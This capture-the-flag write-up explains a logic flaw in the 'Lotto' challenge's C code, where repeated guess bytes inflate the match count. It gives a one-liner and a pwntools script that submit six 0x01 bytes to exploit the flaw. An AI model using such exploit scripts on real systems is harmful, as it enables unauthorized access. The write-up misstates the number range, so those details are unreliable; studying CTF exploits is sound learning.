
---

# **Challenge 13: Lotto**

### **Challenge Overview**
The objective of this challenge is to "guess" 6 random numbers between 1 and 46, generated by the program, to reveal the flag.

At first glance, this seems impossible due to the randomness of the numbers generated from `/dev/urandom`. However, the program contains a **logic vulnerability** that allows us to bypass the randomness and "win" the lotto by exploiting the comparison logic in the code.

---

## **Code Analysis**

### **Key Code Snippets**

1. **Random Number Generation**:
   ```c
   int fd = open("/dev/urandom", O_RDONLY);
   if (fd == -1) {
       printf("error. tell admin\n");
       exit(-1);
   }
   unsigned char lotto[6];
   if (read(fd, lotto, 6) != 6) {
       printf("error2. tell admin\n");
       exit(-1);
   }
   ```
   - The program generates 6 random bytes from `/dev/urandom` and stores them in the `lotto` array.
   - Each byte is reduced to the range `[1, 46]` using:
     ```c
     lotto[i] = lotto[i] % 45 + 1;
     ```

2. **User Input**:
   - The program reads 6 bytes from the user (stored in `submit`).
   - The goal is to "match" all 6 numbers between the `lotto` and `submit` arrays.

3. **Score Calculation (Vulnerable Logic)**:
   ```c
   int match = 0, j = 0;
   for (i = 0; i < 6; i++) {
       for (j = 0; j < 6; j++) {
           if (lotto[i] == submit[j]) {
               match++;
           }
       }
   }
   ```
   - This nested loop compares **every number in `lotto`** with **every number in `submit`**.
   - The issue is that **repeated numbers in `submit`** will cause multiple matches even if `lotto` contains only one matching number.

---

### **Exploitation Strategy**

The flawed comparison logic allows us to manipulate the `match` counter. Specifically:
- If we provide input such as `\x01\x01\x01\x01\x01\x01` (all 1s), every occurrence of `1` in `lotto` will contribute **6 matches** because it’s compared against each `1` in `submit`.

Thus, we can repeatedly play the lotto until the random numbers generated by `/dev/urandom` include at least one `1`. This will result in `match == 6`, and the flag will be revealed.

---

## **Exploitation Approaches**

### **Option 1: Manual Automation with Python CLI**
You can run the following Python command in the CLI repeatedly until the flag is displayed:
```bash
python3 -c "print('1\n' + '\x01' * 6 + '3\n')"
```
- This command:
  - Selects the "Play Lotto" option (`1\n`).
  - Submits the input `\x01\x01\x01\x01\x01\x01`.
  - Exits the program (`3\n`).
- Repeat this command until the flag appears.

---

### **Option 2: Full Python Automation Script**
For full automation, create a Python script that interacts with the binary. The script will:
1. Continuously play the lotto by selecting menu option `1`.
2. Input `\x01\x01\x01\x01\x01\x01` as the 6-byte submission.
3. Loop until the flag is displayed.

The script can be found in the repository.

### **How the Script Works**
1. **Menu Interaction**:
   - The program waits for user input to select a menu option. The script sends `1` to select "Play Lotto."

2. **Input Submission**:
   - The script submits `\x01\x01\x01\x01\x01\x01` as the input.
   - This input exploits the flawed comparison logic to potentially generate a match of 6.

3. **Repeat Until Success**:
   - The script keeps running the binary until stopped

---

## Exploit

```python
from pwn import *

# Path to the binary
conn = process('/root/ctf/lotto/lotto')  # Adjust the path to your binary

while True:
    # Receive the menu
    menu = conn.recvuntil(b"3. Exit\n", timeout=2).decode()
    print(menu)  # Debug print to verify what the program outputs

    # Send the menu choice: "1" for Play Lotto
    conn.sendline(b"1")

    # Receive the prompt for submitting lotto bytes
    prompt = conn.recvuntil(b"Submit your 6 lotto bytes :").decode()
    print(prompt)  # Debug print to verify prompt

    # Send 6 bytes as the lotto ticket
    ticket = b'\x01\x01\x01\x01\x01\x01'  # Replace with your desired values
    conn.sendline(ticket)

    # Read the response after submitting the ticket
    response = conn.recvline(timeout=2).decode()
    print(response)  # Debug print to verify result

# Close the connection
conn.close()

```

## **Key Takeaways**

1. **Logical Vulnerability**:
   - The comparison logic in the program is flawed because it allows repeated numbers in the user’s input to artificially inflate the `match` counter.

2. **Breaking Randomness**:
   - Instead of trying to guess the random numbers, we exploit the program's flawed design to "win" without truly matching all 6 numbers.

3. **Automation**:
   - Automating repetitive tasks is essential for CTF challenges, especially when dealing with randomness.

---
